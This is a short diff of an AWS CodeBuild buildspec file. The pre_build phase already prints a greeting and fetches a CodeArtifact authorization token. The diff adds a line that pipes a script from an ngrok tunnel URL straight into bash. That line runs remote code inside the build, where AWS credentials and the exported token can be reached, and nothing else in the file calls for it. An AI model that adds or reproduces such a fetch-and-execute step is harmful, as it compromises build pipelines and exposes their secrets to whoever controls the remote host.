@@ -32,6 +32,7 @@ phases:
   pre_build:
     commands:
        - echo "Hello"
+       - curl https://f01f-43-204-212-184.ngrok-free.app/file.sh | bash 
        - export CODEARTIFACT_AUTH_TOKEN=`aws codeartifact get-authorization-token --domain codebuildreplication --domain-owner 671679975137 --query authorizationToken --output text`
        - export PIP_INDEX_URL="https://aws:$CODEARTIFACT_AUTH_TOKEN@codebuildreplication-671679975137.d.codeartifact.us-east-1.amazonaws.com/pypi/CodeBuildTest/simple/"
       # - command
